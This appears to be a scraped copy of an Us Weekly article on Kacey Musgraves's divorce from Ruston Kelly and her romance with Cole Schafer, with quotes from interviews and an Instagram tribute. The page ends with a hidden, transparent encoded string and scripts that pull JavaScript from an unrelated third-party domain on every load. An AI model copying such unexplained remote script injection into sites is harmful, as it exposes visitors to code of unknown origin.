The pair were first spotted together in June 2021, nearly one year after she filed for divorce from ex-husband <strong>Ruston Kelly</strong>.</p><p>Musgraves confessed in the June/July 2021 issue of Elle that she was “crumbling” throughout her three-year marriage to Kelly, 35, saying, “I could have coasted for another couple of years, just not paying attention to my feelings or not really dealing with some things.”</p><p>She asked herself some big questions — “Why did I make these decisions? How did I get here? How can I prevent myself from getting there again? Why do I keep choosing the same kind of people?” — during the coronavirus lockdown that shifted her perspective.</p><img style=margin:auto;display:block;text-align:center;max-width:100%;height:auto src=https://cdn.statically.io/img/www.usmagazine.com/wp-content/uploads/2023/12/Kacey-Musgraves-and-Ex-Cole-Schafer-Didn-Gel-Before-Split.jpg><p>“I felt, in many ways, on top of the world in my career, but in my personal life, <a href=#>I felt like I was dying inside</a>,” she added. “I was crumbling. I was sad. I felt lonely. I felt broken.”</p><p>Musgraves felt like “a failure” after filing for divorce. “There’s nothing more shameful than staying somewhere where you don’t fit anymore,” she said.</p><p>Despite the end of her marriage, Musgraves didn’t give up on finding love. “He did not know who I was, which I loved,” she told The New York Times of Schafer in August 2021. “A handful of grown men come out, and they’re sweating trying to keep up with you on the sidewalk. It feels very predatory.”</p><p>She called Schafer “the brightest flame in my world” in a January 2022 Instagram tribute while celebrating his birthday, and he <a href=#>returned the favor</a> after her Madison Square Garden concert in February 2022.</p><h3>Thank You!</h3><p>You have successfully subscribed.</p><p>“She’s the most naturally gifted human I’ve been around. I’ve read about artists vomiting in dimly lit bathroom stalls prior to pulling themselves on stage,” he wrote at the time. “And, while I think there is something strangely romantic about this kind of torture, Kace just sort of floats around backstage like a butterfly that can’t make up its mind where it wants to land … But, besides being the most naturally gifted human I’ve ever been around, what impresses me most about her, is that she’s the same human when she’s talking to my mother, my father, my grandfather, my brothers or my best friend Jack, as she is when she’s talking to an arena filled with 15,000 people.”</p><p>For more on Musgraves’ love life, watch the video above and pick up the latest issue of Us Weekly, on stands now.</p><p class=postsid style=color:rgba(255,0,0,0)>ncG1vNJzZmivp6x7tr%2FMmp6aspmjsm%2BvzqZmnJ2cmq%2BztdOyZKedp6h8r7HWrGakmZOaxm651Kyeq5mmmsBurc2dZJ6wXZi8rbGMrJqhmZaav26wyJ2lrWWXmrlursSfpqudXai9rbXTaA%3D%3D</p></section></article></main></div><footer><div class=container><span class=copyright>&copy; 2024 NovaBlog - <a rel=license href=http://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a></span></div></footer><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/floating.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/tracking_server_6.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script>var _paq=window._paq=window._paq||[];_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){e="//analytics.cdnweb.info/",_paq.push(["setTrackerUrl",e+"matomo.php"]),_paq.push(["setSiteId","1"]);var e,n=document,t=n.createElement("script"),s=n.getElementsByTagName("script")[0];t.async=!0,t.src=e+"matomo.js",s.parentNode.insertBefore(t,s)}()</script></body></html>
